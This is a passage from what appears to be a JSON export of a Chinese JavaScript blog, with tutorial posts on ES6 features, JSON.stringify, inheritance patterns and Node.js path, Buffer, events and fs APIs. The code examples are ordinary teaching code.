...[2, 3, 4], 5)// 1 2 3 4 5[...document.querySelectorAll(&apos;div&apos;)]// [&lt;div&gt;, &lt;div&gt;, &lt;div&gt;] 扩展运算符取代apply方法的一个实际的例子 12345678// ES5 的写法Math.max.apply(null, [14, 3, 77])// ES6 的写法Math.max(...[14, 3, 77])// 等同于Math.max(14, 3, 77); Array.from() Array.from方法用于将两类对象转为真正的数组：类似数组的对象（array-like object）和可遍历（iterable）的对象（包括ES6新增的数据结构Set和Map） 123456789101112let arrayLike = &#123; '0': 'a', '1': 'b', '2': 'c', length: 3&#125;;// ES5的写法var arr1 = [].slice.call(arrayLike); // ['a', 'b', 'c']// ES6的写法let arr2 = Array.from(arrayLike); // ['a', 'b', 'c'] 实际应用中，常见的类似数组的对象是DOM操作返回的NodeList集合，以及函数内部的arguments对象。Array.from都可以将它们转为真正的数组。 querySelectorAll方法返回的是一个类似数组的对象，可以将这个对象转为真正的数组，再使用forEach方法 1234567891011// NodeList对象let ps = document.querySelectorAll('p');Array.from(ps).forEach(function (p) &#123; console.log(p);&#125;);// arguments对象function foo() &#123; var args = Array.from(arguments); // ...&#125; Array.of() Array.of方法用于将一组值，转换为数组 Array.of基本上可以用来替代Array()或new Array() 123Array.of(3, 11, 8) // [3,11,8]Array.of(3) // [3]Array.of(3).length // 1 数组实例的 find() 和 findIndex() 数组实例的find方法，用于找出第一个符合条件的数组成员。它的参数是一个回调函数，所有数组成员依次执行该回调函数，直到找出第一个返回值为true的成员，然后返回该成员。如果没有符合条件的成员，则返回undefined 12[1, 4, -5, 10].find((n) =&gt; n &lt; 0)// -5 数组实例的findIndex方法的用法与find方法非常类似，返回第一个符合条件的数组成员的位置，如果所有成员都不符合条件，则返回-1 123[1, 5, 10, 15].findIndex(function(value, index, arr) &#123; return value &gt; 9;&#125;) // 2 数组实例的fill() fill方法使用给定值，填充一个数组 fill方法用于空数组的初始化非常方便。数组中已有的元素，会被全部抹去 fill方法还可以接受第二个和第三个参数，用于指定填充的起始位置和结束位置 123456789['a', 'b', 'c'].fill(7)// [7, 7, 7]new Array(3).fill(7)// [7, 7, 7]// 接受第二个和第三个参数['a', 'b', 'c'].fill(7, 1, 2)// ['a', 7, 'c'] 数组实例的 entries()，keys() 和 values() ES6 提供三个新的方法——entries()，keys()和values()——用于遍历数组 keys()是对键名的遍历、values()是对键值的遍历，entries()是对键值对的遍历 1234567891011121314151617for (let index of ['a', 'b'].keys()) &#123; console.log(index);&#125;// 0// 1for (let elem of ['a', 'b'].values()) &#123; console.log(elem);&#125;// 'a'// 'b'for (let [index, elem] of ['a', 'b'].entries()) &#123; console.log(index, elem);&#125;// 0 \"a\"// 1 \"b\" 数组实例的 includes() Array.prototype.includes方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的includes方法类似 123[1, 2, 3].includes(2) // true[1, 2, 3].includes(4) // false[1, 2, NaN].includes(NaN) // true 1.6、对象扩展属性的简洁表示法 123456789function f(x, y) &#123; return &#123;x, y&#125;;&#125;// 等同于function f(x, y) &#123; return &#123;x: x, y: y&#125;;&#125; 除了属性简写，方法也可以简写 12345678910111213const o = &#123; method() &#123; return \"Hello!\"; &#125;&#125;;// 等同于const o = &#123; method: function() &#123; return \"Hello!\"; &#125;&#125;; 1234567module.exports = &#123; getItem, setItem, clear &#125;;// 等同于module.exports = &#123; getItem: getItem, setItem: setItem, clear: clear&#125;; 属性名表达式 JavaScript 定义对象的属性，有两种方法 12345// 方法一obj.foo = true;// 方法二obj['a' + 'bc'] = 123; ES6允许字面量定义对象时，用方法二（表达式）作为对象的属性名，即把表达式放在方括号内 123456let propKey = 'foo';let obj = &#123; [propKey]: true, ['a' + 'bc']: 123&#125;; 表达式还可以用于定义方法名 1234567let obj = &#123; ['h' + 'ello']() &#123; return 'hi'; &#125;&#125;;obj.hello() // hi Object.is() Object.is 它用来比较两个值是否严格相等，与严格比较运算符（===）的行为基本一致 1234Object.is('foo', 'foo')// trueObject.is(&#123;&#125;, &#123;&#125;)// false 不同之处只有两个：一是+0不等于-0，二是NaN等于自身 12345+0 === -0 //trueNaN === NaN // falseObject.is(+0, -0) // falseObject.is(NaN, NaN) // true Object.assign() Object.assign方法用于对象的合并，将源对象的所有可枚举属性，复制到目标对象 1234567const target = &#123; a: 1 &#125;;const source1 = &#123; b: 2 &#125;;const source2 = &#123; c: 3 &#125;;Object.assign(target, source1, source2);target // &#123;a:1, b:2, c:3&#125; 属性的遍历 ES6 一共有5种方法可以遍历对象的属性 for...in for...in循环遍历对象自身的和继承的可枚举属性（不含 Symbol 属性） Object.keys(obj) Object.keys返回一个数组，包括对象自身的（不含继承的）所有可枚举属性（不含 Symbol 属性）的键名 Object.getOwnPropertyNames(obj) Object.getOwnPropertyNames返回一个数组，包含对象自身的所有属性（不含 Symbol 属性，但是包括不可枚举属性）的键名 Object.getOwnPropertySymbols(obj) Object.getOwnPropertySymbols返回一个数组，包含对象自身的所有 Symbol 属性的键名 Reflect.ownKeys(obj) Reflect.ownKeys返回一个数组，包含对象自身的所有键名，不管键名是 Symbol 或字符串，也不管是否可枚举 1.7、函数扩展函数参数的默认值 ES6 允许为函数的参数设置默认值，即直接写在参数定义的后面 1234567function log(x, y = 'World') &#123; console.log(x, y);&#125;log('Hello') // Hello Worldlog('Hello', 'China') // Hello Chinalog('Hello', '') // Hello 与解构赋值默认值结合使用 参数默认值可以与解构赋值的默认值，结合起来使用 1234567function foo(&#123;x, y = 5&#125;) &#123; console.log(x, y);&#125;foo(&#123;&#125;) // undefined 5foo(&#123;x: 1&#125;) // 1 5foo(&#123;x: 1, y: 2&#125;) // 1 2 rest 参数 ES6 引入 rest 参数（形式为...变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了。rest 参数搭配的变量是一个数组，该变量将多余的参数放入数组中 1234567891011function add(...values) &#123; let sum = 0; for (var val of values) &#123; sum += val; &#125; return sum;&#125;add(2, 5, 3) // 10 箭头函数 123456var f = v =&gt; v//箭头函数等同于var f = function(v) &#123; return v;&#125;; 123456789var f = () =&gt; 5;// 等同于var f = function () &#123; return 5 &#125;;var sum = (num1, num2) =&gt; num1 + num2;// 等同于var sum = function(num1, num2) &#123; return num1 + num2;&#125;; 绑定 this 箭头函数可以绑定this对象，大大减少了显式绑定this对象的写法（call、apply、bind） 第二部分：新增2.1、Symbol ES6引入了一种新的原始数据类型Symbol，表示独一无二的值 凡是属性名属于 Symbol 类型，就都是独一无二的，可以保证不会与其他属性名产生冲突 2.2、Proxy 对要保护的对象套一层，不被外界所访问。Proxy 可以理解成，在目标对象之前架设一层“拦截”，外界对该对象的访问，都必须先通过这层拦截，因此提供了一种机制，可以对外界的访问进行过滤和改写 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556let obj=&#123; time:'2017-03-11', name:'net', _r:123 &#125;; let monitor=new Proxy(obj,&#123; // 拦截对象属性的读取 get(target,key)&#123; return target[key].replace('2017','2018') &#125;, // 拦截对象设置属性 set(target,key,value)&#123; if(key==='name')&#123; return target[key]=value; &#125;else&#123; return target[key]; &#125; &#125;, // 拦截key in object操作 has(target,key)&#123; if(key==='name')&#123; return target[key] &#125;else&#123; return false; &#125; &#125;, // 拦截delete deleteProperty(target,key)&#123; if(key.indexOf('_')&gt;-1)&#123; delete target[key]; return true; &#125;else&#123; return target[key] &#125; &#125;, // 拦截Object.keys,Object.getOwnPropertySymbols,Object.getOwnPropertyNames ownKeys(target)&#123; return Object.keys(target).filter(item=&gt;item!='time') &#125; &#125;); console.log('get',monitor.time); monitor.time='2018'; monitor.name='poetries'; console.log('set',monitor.time,monitor); console.log('has','name' in monitor,'time' in monitor); // delete monitor.time; // console.log('delete',monitor); // // delete monitor._r; // console.log('delete',monitor); console.log('ownKeys',Object.keys(monitor)); 2.3、Reflect Reflect对象与Proxy对象一样，也是ES6 为了操作对象而提供的新 API 12345678910let obj=&#123;time:'2017-03-11',name:'net',_r:123&#125;;console.log('Reflect get',Reflect.get(obj,'time'));Reflect.set(obj,'name','poetries');console.log(obj);console.log('has',Reflect.has(obj,'name')); 2.4、Set和MapSet Set和Map类似，也是一组key的集合，但不存储value。由于key不能重复，所以，在Set中，没有重复的key 要创建一个Set，需要提供一个Array作为输入，或者直接创建一个空Set 12var s1 = new Set(); // 空Setvar s2 = new Set([1, 2, 3]); // 含1, 2, 3 重复元素在Set中自动被过滤 12var s = new Set([1, 2, 3, 3, &apos;3&apos;]);s; // Set &#123;1, 2, 3, &quot;3&quot;&#125; 通过add(key)方法可以添加元素到Set中，可以重复添加，但不会有效果 123456&gt;&gt;&gt; s.add(4)&gt;&gt;&gt; s&#123;1, 2, 3, 4&#125;&gt;&gt;&gt; s.add(4)&gt;&gt;&gt; s&#123;1, 2, 3, 4&#125; 通过delete(key)方法可以删除元素 1234var s = new Set([1, 2, 3]);s; // Set &#123;1, 2, 3&#125;s.delete(3);s; // Set &#123;1, 2&#125; Map Map是一组键值对的结构，具有极快的查找速度 用Map实现，只需要一个“名字”-“成绩”的对照表，直接根据名字查找成绩，无论这个表有多大，查找速度都不会变慢。用JavaScript写一个Map如下： 12var m = new Map([[&apos;Michael&apos;, 95], [&apos;Bob&apos;, 75], [&apos;Tracy&apos;, 85]]);m.get(&apos;Michael&apos;); // 95 初始化Map需要一个二维数组，或者直接初始化一个空Map。Map具有以下方法 1234567var m = new Map(); // 空Mapm.set(&apos;Adam&apos;, 67); // 添加新的key-valuem.set(&apos;Bob&apos;, 59);m.has(&apos;Adam&apos;); // 是否存在key &apos;Adam&apos;: truem.get(&apos;Adam&apos;); // 67m.delete(&apos;Adam&apos;); // 删除key &apos;Adam&apos;m.get(&apos;Adam&apos;); // undefined 由于一个key只能对应一个value，所以，多次对一个key放入value，后面的值会把前面的值冲掉 1234var m = new Map();m.set(&apos;Adam&apos;, 67);m.set(&apos;Adam&apos;, 88);m.get(&apos;Adam&apos;); // 88 2.5、Promise Promise 是异步编程的一种解决方案，比传统的解决方案——回调函数和事件——更合理和更强大 Promise对象代表一个异步操作，有三种状态 pending（进行中） fulfilled（已成功） rejected（已失败） 基本用法 123456789var promise = new Promise(function(resolve, reject) &#123; // ... some code if (/* 异步操作成功 */)&#123; resolve(value); &#125; else &#123; reject(error); &#125;&#125;); Promise实例生成以后，可以用then方法分别指定resolved状态和rejected状态的回调函数 12345promise.then(function(value) &#123; // success&#125;, function(error) &#123; // failure&#125;); 2.6、Generator generator（生成器）是ES6标准引入的新的数据类型。一个generator看上去像一个函数，但可以返回多次 2.7、Class123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100&#123; // 基本定义和生成实例 class Parent&#123; constructor(name='poetries')&#123; this.name=name; &#125; &#125; let v_parent=new Parent('v'); console.log('构造函数和实例',v_parent);&#125;&#123; // 继承 class Parent&#123; constructor(name='poetries')&#123; this.name=name; &#125; &#125; class Child extends Parent&#123; &#125; console.log('继承',new Child());&#125;&#123; // 继承传递参数 class Parent&#123; constructor(name='poetries')&#123; this.name=name; &#125; &#125; class Child extends Parent&#123; constructor(name='child')&#123; super(name); this.type='child'; &#125; &#125; console.log('继承传递参数',new Child('hello'));&#125;&#123; // getter,setter class Parent&#123; constructor(name='poetries')&#123; this.name=name; &#125; get longName()&#123; return 'mk'+this.name &#125; set longName(value)&#123; this.name=value; &#125; &#125; let v=new Parent(); console.log('getter',v.longName); v.longName='hello'; console.log('setter',v.longName);&#125;&#123; // 静态方法 class Parent&#123; constructor(name='poetries')&#123; this.name=name; &#125; static tell()&#123; console.log('tell'); &#125; &#125; Parent.tell();&#125;&#123; // 静态属性 class Parent&#123; constructor(name='poetries')&#123; this.name=name; &#125; static tell()&#123; console.log('tell'); &#125; &#125; Parent.type='test'; console.log('静态属性',Parent.type);&#125; 2.8、Module123456789101112131415let A=123;let test=function()&#123; console.log('test');&#125;class Hello&#123; test()&#123; console.log('class'); &#125;&#125;export default &#123; A, test, Hello&#125;","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://ru23.com/tags/JavaScript/"},{"name":"ES6","slug":"ES6","permalink":"https://ru23.com/tags/ES6/"}]},{"title":"浅析JSON.stringify","slug":"2017-10-json-stringify","date":"2017-10-21T06:40:43.000Z","updated":"2018-10-24T09:45:46.574Z","comments":true,"path":"note/320f1b94.html","link":"","permalink":"https://ru23.com/note/320f1b94.html","excerpt":"","text":"一、JSON.stringify参数详解 stringify方法顾名思义，就是把JSON序列化，其语法如下 1JSON.stringify(value [, replacer] [, space]) value：是必选字段。就是你输入的对象、如数组等 replacer：这个是可选的。它又分为2种方式，一种是数组，第二种是方法【过滤函数，或者key的过滤数组（只有在数组中的会展示）】 情况一：replacer为数组时，通过后面的实验可以知道，它是和第一个参数value有关系的。一般来说，系列化后的结果是通过键值对来进行表示的。 所以，如果此时第二个参数的值在第一个存在，那么就以第二个参数的值做key，第一个参数的值为value进行表示，如果不存在，就忽略。 情况二：replacer为方法时，那很简单，就是说把系列化后的每一个对象（记住是每一个）传进方法里面进行处理。 space：就是用什么来做分隔符的【格式化前面的空格字符】 如果省略的话，那么显示出来的值就没有分隔符，直接输出来 如果是一个数字的话，那么它就定义缩进几个字符，当然如果大于10 ，则默认为10，因为最大值为10 如果是一些转义字符，比如\\t，表示回车，那么它每行一个回车。 如果仅仅是字符串，就在每行输出值的时候把这些字符串附加上去。当然，最大长度也是10个字符 二、只传一个参数12345678var obj = &#123; name:\"poetries\", age:22, job:\"FED\", location:\"shenzhen of China\"&#125;;JSON.stringify(obj) //\"&#123;\"name\":\"poetries\",\"age\":22,\"job\":\"FED\",\"location\":\"shenzhen of China\"&#125;\" 注意点 JSON.stringify对obj里面的数据类型有一些要求 非数组对象的属性不能保证以特定的顺序出现在序列化后的字符串中 1JSON.stringify(&#123;x: 5, y: 6&#125;) // '&#123;\"x\":5,\"y\":6&#125;' 或者 '&#123;\"y\":6,\"x\":5&#125;' 都可能 布尔值、数字、字符串的包装对象在序列化过程中会自动转换成对应的原始值 undefined、任意的函数以及 symbol 值，在序列化过程中会被忽略（出现在非数组对象的属性值中时）或者被转换成 null（出现在数组中时） 123456789101112var obj = &#123; \"undefined\":undefined, \"null\":null, \"true\":true, \"func\":function()&#123;&#125;, \"symbol\":Symbol(\"\")&#125;;JSON.stringify(obj); //\"&#123;\"null\":null,\"true\":true&#125;\"// 出现在数组中时被转化成nullvar arr = [undefined,Symbol(\"\"),function()&#123;&#125;];JSON.stringify(arr); //[null,null,null] 不可枚举的属性会被忽略 12JSON.stringify( Object.create(null, &#123; x: &#123; value: 'x', enumerable: false &#125;, y: &#123; value: 'y', enumerable: true &#125; &#125;) );// '&#123;\"y\":\"y\"&#125;' 三、传递两个参数的时候 第二个参数可以是一个过滤函数，也可以是一个数组 当为数组时则只有包含在这个数组中的属性名才会被序列化到最终的 JSON 字符串中 3.1 过滤函数 注意点： 这里一定要return一个值给下一个遍历函数作为参数传入，如果不return的话，后面的遍历就没法玩下去了 1234567891011var obj = &#123; name:\"poetries\", age:22, job:\"FED\", location:\"shenzhen of China\"&#125;;JSON.stringify(obj, (key,value) =&gt; &#123; console.log(key) return value; // 这个是必须的，用于下一次的循环迭代&#125;) 3.2 数组12345678910var obj = &#123; name:\"poetries\", age:22, job:\"FED\", location:\"shenzhen of China\"&#125;;JSON.stringify(obj, [\"name\", \"age\"]);//job、location由于不在列表里，所以没被序列化//\"&#123;\"name\":\"poetries\",\"age\":22&#125;\" 四、传递三个参数的时候 第三参数space用来控制结果字符串里面的间距 如果是一个数字, 则在字符串化时每一级别会比上一级别缩进多这个数字值的空格（最多10个空格） 如果是一个字符串，则每一级别会比上一级别多缩进用该字符串（或该字符串的前十个字符） 123456789101112var obj = &#123;name:\"poetries\",age:22,job:\"FED\",location:\"shenzhen of China\",lov:&#123;age:11&#125;&#125;;JSON.stringify(obj, null,10);// //每一个层级比上一个多10个空格\"&#123; \"name\": \"poetries\", \"age\": 22, \"job\": \"FED\", \"location\": \"shenzhen of China\", \"lov\": &#123; \"age\": 11 &#125;&#125;\" 12345678910111213141516171819202122232425262728var obj = &#123; name:\"poetries\", age:22, job:\"FED\", location:\"shenzhen of China\", lov:&#123; age:11 &#125;&#125;;JSON.stringify(obj, null,\"\\n\");// 每一个层级比上一个多了一个回车符\"&#123;\"name\": \"poetries\",\"age\": 22,\"job\": \"FED\",\"location\": \"shenzhen of China\",\"lov\": &#123;\"age\": 11&#125;&#125;\" 五、toJSON 方法 如果一个被序列化的对象拥有 toJSON 方法，那么该 toJSON 方法就会覆盖该对象默认的序列化行为 123456789101112var obj = &#123; name:\"poetries\", info:&#123; age:18, sex:\"male\" &#125;, toJSON:function()&#123; return \"via toJSON\"; &#125;&#125;;JSON.stringify(obj); // \"\"via toJSON\"\"","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"}]},{"title":"JavaScript继承的几种方式","slug":"2017-10-js-inherit-methods","date":"2017-10-18T11:46:43.000Z","updated":"2018-10-24T03:46:02.184Z","comments":true,"path":"note/6d4a6414.html","link":"","permalink":"https://ru23.com/note/6d4a6414.html","excerpt":"","text":"JavaScript继承本质和原型链有关 原型、实例、构造函数、原型链之间的关系 原型、实例、构造函数、原型链之间的关系 一、借助构造函数实现继承 缺点：实例无法访问父类原型上的属性 123456789101112function Parent1 () &#123; this.name = 'parent1';&#125;Parent1.prototype.say = function () &#123;&#125;;function Child1 () &#123; Parent1.call(this); this.type = 'child1';&#125;// Parent1原型上的say没法拿到console.log(new Child1(), new Child1().say()); 二、借助原型链实现继承 缺点：子类和父类公用一个原型,最后导致子类的多个实例都是一样的，无法隔离 12345678910111213function Parent2 () &#123; this.name = 'parent2'; this.play = [1, 2, 3];&#125;function Child2 () &#123; this.type = 'child2';&#125;Child2.prototype = new Parent2();var s1 = new Child2();var s2 = new Child2();s1.play.push(4);console.log(s1.play, s2.play); // [1, 2, 3, 4] [1, 2, 3,4] 结果是一样的，说明两个实例无法隔离 三、组合继承方式 此方法解决了上面的实例相同的问题，但是父类的构造函数执行了多次 12345678910111213function Parent3 () &#123; this.name = 'parent3'; this.play = [1, 2, 3];&#125;function Child3 () &#123; Parent3.call(this); this.type = 'child3';&#125;Child3.prototype = new Parent3(); // 把Parent3的实例指向Child3的原型var s3 = new Child3();var s4 = new Child3();s3.play.push(4);console.log(s3.play, s4.play); // [1, 2, 3, 4] [1, 2, 3] 优化组合继承1：此方法解决了父类的构造函数执行了多次问题，但是无法判断实例是由子类创建的，还是父类创建的 12345678910111213141516171819202122232425262728293031function Parent4 () &#123; this.name = 'parent4'; this.play = [1, 2, 3];&#125;function Child4 () &#123; Parent4.call(this); this.type = 'child4';&#125;Child4.prototype = Parent4.prototype; // Child4和Parent4公用一个原型了var s5 = new Child4();var s6 = new Child4();console.log(s5, s6);console.log(s5 instanceof Child4, s5 instanceof Parent4); // 都是返回trueconsole.log(s5.constructor); // 这里返回的构造函数是Parent4，而不是Child4，问题所在``` - 优化组合继承2：完美解决方案```javascriptfunction Parent5 () &#123; this.name = 'parent5'; this.play = [1, 2, 3];&#125;function Child5 () &#123; Parent5.call(this); this.type = 'child5';&#125;Child5.prototype = Object.create(Parent5.prototype);Child5.prototype.constructor = Child5; //重新修改了Child5的构造函数为Child5","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"https://ru23.com/tags/Javascript/"},{"name":"继承","slug":"继承","permalink":"https://ru23.com/tags/继承/"}]},{"title":"Nodejs之基础API（三）","slug":"2017-10-node-base-api","date":"2017-10-15T12:50:35.000Z","updated":"2018-10-24T03:46:02.199Z","comments":true,"path":"note/b424fccc.html","link":"","permalink":"https://ru23.com/note/b424fccc.html","excerpt":"","text":"Path 提供了一些工具函数，用于处理文件与目录的路径 basename、dirname与extname 返回一个 path的最后一部分 返回一个 path 的目录名 返回 path 的扩展名 1234567const &#123;basename,dirname,extname&#125; = require(\"path\");const filePath = \"/usr/local/bin/test.txt\";console.log(basename(filePath)); // test.txtconsole.log(dirname(filePath)); // /usr/local/binconsole.log(extname(filePath)); // .txt join、normalize与resolve path.join()方法使用平台特定的分隔符把全部给定的 path 片段连接到一起，并规范化生成的路径 path.normalize() 方法会规范化给定的 path，并解析 &#39;..&#39;和 &#39;.&#39;片段 path.resolve() 方法会把一个相对路径解析为一个绝对路径 12345path.join('/foo', 'bar', 'baz/asdf', 'quux', '..');// 返回: '/foo/bar/baz/asdf'path.join('foo', &#123;&#125;, 'bar');// 抛出 'TypeError: Path must be a string. Received &#123;&#125;' path.format与path.parse path.format()方法会从一个对象返回一个路径字符串。 与 path.parse() 相反 path.parse()方法返回一个对象，对象的属性表示 path 的元素 123456789const &#123;parse,format&#125; = require(\"path\");const filePath = \"/usr/local/bin/test.txt\";const parse_ret = parse(filePath);const format_ret = format(parse_ret)console.log(parse_ret);console.log(format_ret); 结果 123456&#123; root: '/', dir: '/usr/local/bin', base: 'test.txt', ext: '.txt', name: 'test' &#125;/usr/local/bin\\test.txt sep、delimiter、win32、posix 和操作系统有关的东西 sep：提供了平台特定的路径片段分隔符 Windows 上是\\ POSIX 上是 / path.win32提供了 path 方法针对Windows 的实现 posix 属性提供了 path方法针对 POSIX 的实现 delimiter 就是 &quot;:&quot; 12345678910const &#123;sep,delimiter,win32,posix&#125; = require(\"path\");const filePath = \"/usr/local/bin/test.txt\";console.log(\"sep \",sep);console.log(\"posix sep \",posix.sep);console.log(\"win32 sep \",win32.sep);console.log(\"PATH\",process.env.PATH);console.log(\"delimiter \",delimiter); 12345678sep \\posix sep /win32 sep \\PATH C:\\Python27\\;C:\\Python27\\Scripts;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\Git\\bin;C:\\Program Files\\nodejs;;e:\\Program Files\\VS Code\\bin;C:\\Users\\Administrator\\AppData\\Roaming\\npm;.;;.;;.;delimiter ; 回顾小结 1234567const path = require(\"path\")// 路径相关console.log(\"__dirname\", __dirname); //文件夹console.log(\"__filename\", __filename); //文件名console.log(\"process.cwd()\", process.cwd()); //绝对路径console.log(\"./\", path.resolve()); //根据相对路径取得绝对路径 __dirname、__filename 总是返回文件的绝对路径 process.cwd()总是返回node命令所在文件夹（就是用户在哪里启动的node脚本的路径） Buffer buffer用来处理二进制数据流的 类似于整数数组，大小固定 Buffer 类在 Node.js 中是一个全局变量，因此无需使用 require(‘buffer’).Buffer 12345678// 创建一个长度为 10、且用 0 填充的 Buffer。const buf1 = Buffer.alloc(10)// 创建一个长度为 10、且用 0x1 填充的 Buffer。 const buf2 = Buffer.alloc(10, 1);// 创建一个包含 [0x1, 0x2, 0x3] 的 Buffer。const buf4 = Buffer.from([1, 2, 3]); Buffer类常用的方法 byteLength 计算字符串占了几个字节 Buffer.isBuffer判断是否是buffer对象 Buffer.concat拼接Buffer 123456789101112131415161718192021222324252627// byteLength 计算字符串占了几个字节console.log(Buffer.byteLength(\"test\")) // 4 console.log(Buffer.byteLength(\"测试\")) // 6字节// Buffer.isBuffer判断是否是buffer对象console.log(Buffer.isBuffer(&#123;&#125;))console.log(Buffer.isBuffer(Buffer.from([1,2,3])))// Buffer.concat拼接Bufferconst buf1 = Buffer.from(\"This \")const buf2 = Buffer.from(\"is \")const buf3 = Buffer.from(\"a \")const buf4 = Buffer.from(\"test \")const buf5 = Buffer.from(\"buffer\")const buf = Buffer.concat([buf1,buf2,buf3,buf4,buf5]);console.log(buf.toString());/**46falsetrueThis is a test buffer**/ Buffer实例常用方法 buf.length buf.toString() buf.fill() 填充一些值 buf.equals() 两个buffer的内容是否相等 buf.indexOf() 找到字符的位置 buf.copy() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748const buf = Buffer.from(\"This is a test!\");console.log(buf.length); // 15console.log(buf.toString(\"base64\")); const buf1 = Buffer.allocUnsafe(10);// buf1.fill填充一些值//&lt;Buffer a0 b4 25 00 00 00 00 00 01 00&gt;//&lt;Buffer a0 b4 0a 0a 0a 0a 00 00 01 00&gt;console.log(buf1)console.log(buf1.fill(10,2,6)) // 从第二个开始到第六个填充10// buf.equals两个buffer的内容是否相等const buf2 = Buffer.from(\"test\")const buf3 = Buffer.from(\"test\")const buf4 = Buffer.from(\"test!\")console.log(buf2.equals(buf3)) // trueconsole.log(buf2.equals(buf4)) // false// buf.indexOf() 找到字符的位置console.log(buf2.indexOf(\"es\")); // 1console.log(buf2.indexOf(\"esa\")); // -1// 解决中文乱码问题const StringDecoder = require(\"string_decoder\").StringDecoder;const decoder = new StringDecoder(\"utf8\");const buf5 = Buffer.from(\"中文字符串\"); // 乱码for (let i=0;i&lt;buf5.length;i+=5) &#123; const b = Buffer.allocUnsafe(5); buf5.copy(b,0,i); console.log(b.toString());&#125;// 不在乱码for (let i=0;i&lt;buf5.length;i+=5) &#123; const b = Buffer.allocUnsafe(5); buf5.copy(b,0,i); console.log(decoder.write(b));&#125; event 大多数 Node.js 核心 API 都采用惯用的异步事件驱动架构，其中某些类型的对象（触发器）会周期性地触发命名事件来调用函数对象（监听器） eventEmitter.on() 方法用于注册监听器，eventEmitter.emit() 方法用于触发事件 这和在浏览器上不同，在浏览器上靠的是用户做的一些UI的操作触发，如click\\hover 12345678910111213141516const EventEmitter = require(\"events\");// 继承EventEmitter类class CustomEvent extends EventEmitter &#123;&#125;const ce = new CustomEvent();// 绑定一个事件名 test，完成事件处理程序ce.on(\"test\",()=&gt;&#123; console.log(\"This is a test\");&#125;)setInterval(()=&gt;&#123; // emit触发事件 ce.emit(\"test\");&#125;,500) 123456789101112131415const EventEmitter = require(\"events\");// 继承EventEmitter类class CustomEvent extends EventEmitter &#123;&#125;const ce = new CustomEvent();// 绑定事件处理程序ce.on(\"error\",(err,time) =&gt; &#123; console.log(err); console.log(time);&#125;)// 给事件处理程序传递多个参数ce.emit(\"error\", new Error(\"出错了\"),Date.now()) 12345678910111213141516const EventEmitter = require(\"events\");// 继承EventEmitter类class CustomEvent extends EventEmitter &#123;&#125;const ce = new CustomEvent();// once只响应一次事件 如jQuery中的once()ce.once(\"test\",()=&gt; &#123; console.log(\"test event once\");&#125;)setInterval(()=&gt;&#123; // emit触发事件 ce.emit(\"test\");&#125;,500) 123456789101112131415161718192021222324252627const EventEmitter = require(\"events\");// 继承EventEmitter类class CustomEvent extends EventEmitter &#123;&#125;function fn1() &#123; console.log(\"fn1\")&#125;function fn2() &#123; console.log(\"fn2\")&#125;const ce = new CustomEvent();ce.on(\"test\",fn1);ce.on(\"test\",fn2);setInterval(()=&gt;&#123; // emit触发事件 ce.emit(\"test\");&#125;,500)// removeListener移除事件setTimeout(()=&gt;&#123; // ce.removeListener(\"test\",fn2) ce.removeAllListeners(\"test\"); //移除test绑定的事件&#125;,1500) fs 异步方法的最后一个参数都是一个回调函数。 传给回调函数的参数取决于具体方法，但回调函数的第一个参数都会保留给异常。 如果操作成功完成，则第一个参数会是 null 或 undefined 当使用同步方法时，任何异常都会被立即抛出。 可以使用 try/catch 来处理异常，或让异常向上冒泡 12345678910111213// 读文件const fs = require(\"fs\");// readFile 异步操作// 规范：回调函数的第一个参数都会保留给异常fs.readFile(\"./fs.js\",\"utf8\",(err,data)=&gt;&#123; if (err) throw err; console.log(data);&#125;);// readFile 同步操作（同步先执行）const data = fs.readFileSync(\"./path.js\",\"utf8\");console.log(data) 12345678// 写文件const fs = require(\"fs\");fs.writeFile(\"./write.js\",\"This is a test\",&#123;encoding:\"utf8\"&#125;,err=&gt;&#123; if (err) throw err; console.log(\"done\");&#125;); 1234567891011121314151617181920212223242526272829303132const fs = require(\"fs\");//stat文件信息fs.stat(\"./fs.js\",(err,stats)=&gt;&#123; if (err) &#123; console.log(\"文件不存在\"); return; &#125;; console.log(stats.isFile()) //true console.log(stats.isDirectory()) //false console.log(stats) /** Stats &#123; dev: -835755091, mode: 33206, nlink: 1, uid: 0, gid: 0, rdev: 0, blksize: undefined, ino: 562949953557826, size: 216, blocks: undefined, atime: 2017-10-15T12:24:01.933Z, mtime: 2017-10-15T12:49:00.341Z, ctime: 2017-10-15T12:49:00.341Z, birthtime: 2017-10-15T12:24:01.871Z &#125; */&#125;) 12345678// rename修改文件名const fs = require(\"fs\");fs.rename(\"./write.js\",\"test.js\",err=&gt;&#123; if (err) throw err; console.log(\"done\");&#125;) 1234567// unlink删除文件const fs = require(\"fs\");fs.unlink(\"./test.js\",err=&gt;&#123; if (err) throw err; console.log(\"done\");&#125;) 123456789101112131415161718// 读文件夹相关操作const fs = require(\"fs\");fs.readdir(\"./\",(err,files)=&gt;&#123; if (err) throw err; console.log(files); /** [ '.vscode', 'buffer.js', 'events.js', 'fs.js', 'path.js', 'test1.js', 'test2.js', 'test3.js', 'test4.js' ] **/&#125;) 1234// 创建文件夹const fs = require(\"fs\");fs.mkdir(\"test\",err=&gt;&#123;&#125;); 1234// 删除文件夹const fs = require(\"fs\");fs.rmdir(\"./test\",err=&gt;&#123;&#125;); 12345678// watch监视文件变化const fs = require(\"fs\");fs.watch(\"./\",&#123; recursive: true //是否循环递归&#125;,(eventType,filename) =&gt; &#123; console.log(eventType, filename)&#125;) 123456// readStream 流 (从一个方向流向另一个方向)const fs = require(\"fs\");const rs = fs.createReadStream(\"./fs.js\");rs.pipe(process.stdout) // process.stdout控制台 1234567891011121314151617181920// writeStream const fs = require(\"fs\");const ws = fs.createWriteStream(\"./test5.js\");const time = setInterval(()=&gt;&#123; const num = parseInt(Math.random() * 10); if (num &lt; 7) &#123; 